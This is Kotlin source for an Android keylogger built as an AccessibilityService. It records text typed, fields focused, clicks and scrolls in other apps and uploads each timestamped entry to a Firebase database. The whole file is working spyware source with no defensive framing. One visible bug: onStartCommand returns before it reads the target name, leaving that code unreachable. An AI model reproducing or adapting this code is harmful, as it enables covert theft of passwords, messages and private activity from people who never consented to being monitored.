package com.sm.sdt.firebasekeyloggerandroird

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.util.Log.i
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.FirebaseDatabase
import com.sm.sdt.firebasekeyloggerandroird.ConstFun.getDateTime

class keyloggerService : AccessibilityService() {

    val TAG = "AccessibilityServiceTAG"
    val firebaseDatabase = FirebaseDatabase.getInstance()
    val dataRef = firebaseDatabase.getReference("users")
    var name : String? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return super.onStartCommand(intent, flags, startId)
        name = intent?.getStringExtra("name")
        i(TAG, name.toString())

        return START_STICKY

    }


    override fun onServiceConnected() {
        i(TAG, "onServiceConnected: Keylogger Activated")
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        when (event!!.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TEXT)| $data")
                dataRef.child(name.toString()).push().child("keylog").setValue("${getDateTime()} |(TEXT)| $data")
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                dataRef.child(name.toString()).push().child("keylog").setValue("${getDateTime()} |(FOCUSED)| $data")
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CLICKED)| $data")
                dataRef.child(name.toString()).push().child("keylog").setValue("${getDateTime()} |(CLICKED)| $data")
            }

            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    i(TAG, "${getDateTime()} |(SCROLLED)| $data")
                    dataRef.child(name.toString()).push().child("keylog").setValue("${getDateTime()} |(SCROLLED)| $data")
                }

            }

            AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TYPE_ASSIST_READING_CONTEXT)| $data")
                dataRef.child(name.toString()).push().child("keylog")
                    .setValue("${getDateTime()} |(READING_CONTEXT)| $data")
            }


            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CONTEXT_CLICKED)| $data")
                dataRef.child(name.toString()).push().child("keylog")
                    .setValue("${getDateTime()} |(CONTEXT_CLICKED)| $data")
            }
        }
    }

    override fun onInterrupt() {
        Log.i(TAG, "onInterrupt: Keylogger interrupted")
    }


}